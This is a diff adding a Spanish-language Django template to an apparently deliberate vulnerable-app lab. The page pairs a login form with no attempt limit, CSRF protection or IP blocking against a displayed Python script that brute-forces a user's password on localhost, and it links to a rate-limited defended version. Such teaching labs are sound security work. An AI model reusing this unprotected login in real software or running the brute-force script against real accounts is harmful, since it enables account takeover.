@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <title>Login Vulnerable · TiendaTest</title>
+  {% load static %}
+  <link rel="stylesheet" href="{% static 'store/css/main.css' %}">
+</head>
+<body class="app-body">
+  {% include 'store/navbar.html' %}
+  <div class="app-container">
+    <section class="panel-section">
+      <div class="section-header">
+        <h2>🔓 Login Vulnerable — Fuerza Bruta</h2>
+        <span class="badge badge-off">⚠️ Sin límite de intentos</span>
+      </div>
+      <div class="vuln-grid">
+        <div>
+          <p class="vuln-desc">Sin límite de intentos, sin CSRF, sin bloqueo por IP. Puedes automatizar ataques con scripts externos.</p>
+          <form method="POST">
+            <div class="form-group">
+              <label>Usuario</label>
+              <input type="text" name="username" value="usuario2"/>
+            </div>
+            <div class="form-group">
+              <label>Contraseña</label>
+              <input type="text" name="password" placeholder="prueba contraseñas"/>
+            </div>
+            <button type="submit" class="btn btn-danger">Intentar login</button>
+          </form>
+          {% if resultado %}
+            <div class="alert {% if '✅' in resultado %}alert-ok{% else %}alert-error{% endif %}" style="margin-top:1rem">
+              {{ resultado }}
+            </div>
+          {% endif %}
+        </div>
+        <div class="ataque-info">
+          <h4>🧪 Script de fuerza bruta (Python)</h4>
+          <pre class="code-block">import requests
+
+url = "http://127.0.0.1:8000/login-vulnerable/"
+usuario = "usuario2"
+passwords = ["1234", "abc123", "password123", "admin", "test"]
+
+for pwd in passwords:
+    r = requests.post(url, data={
+        "username": usuario,
+        "password": pwd
+    })
+    if "ÉXITO" in r.text:
+        print(f"✅ Encontrada: {pwd}")
+        break
+    else:
+        print(f"❌ Fallida: {pwd}")</pre>
+          <p style="color:var(--muted);font-size:.8rem;margin-top:.5rem">Corre este script desde otra terminal con <code>pip install requests</code></p>
+        </div>
+      </div>
+    </section>
+    <section class="panel-section">
+      <div class="section-header">
+        <h2>🛡️ Defensa — Login con límite de intentos</h2>
+        <span class="badge badge-ok">Protegido</span>
+      </div>
+      <p class="vuln-desc">Máximo 5 intentos por IP y usuario. Bloqueo de 5 minutos automático.</p>
+      <a href="{% url 'login_seguro' %}" class="btn btn-primary">Ver login seguro →</a>
+    </section>
+  </div>
+</body>
+</html>
